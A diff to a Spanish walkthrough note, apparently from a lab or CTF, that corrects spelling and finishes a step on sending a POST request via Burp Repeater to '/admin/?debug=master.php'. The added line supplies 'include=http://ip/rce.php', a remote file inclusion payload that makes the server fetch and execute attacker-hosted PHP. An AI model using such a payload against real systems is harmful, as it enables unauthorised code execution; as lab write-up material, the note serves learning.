@@ -321,5 +321,5 @@ enviamos todo al apartado de repeater para poder hacer las pruebas. haciendo cli
 ![[Pasted image 20240520170659.png]]
 
 `Metodo POST`
-al cambiar el método de la petición tambien cambiara la direccion a donde se va a realizar. asegurate de mantener la direccion apuntando al lugar correcto en este caso `/admin/?debug=master.php` en la parte inferior del método POST nos va a indicar que `debug=/admin/?` pero esto no lo queremos ya que `eval` hace un llamado de `include` es este ca
+al cambiar el método de la petición también cambiara la dirección a donde se va a realizar. asegúrate de mantener la dirección apuntando al lugar correcto en este caso `/admin/?debug=master.php` en la parte inferior del método POST nos va a indicar que `debug=/admin/?` pero esto no lo queremos ya que `eval` hace un llamado de `include` es este caso debemos usar `include=http://ip/rce.php` ya que esta es la dirección en la que se esta compartiendo nuestro recurso 
 ![[Pasted image 20240520171144.png]]
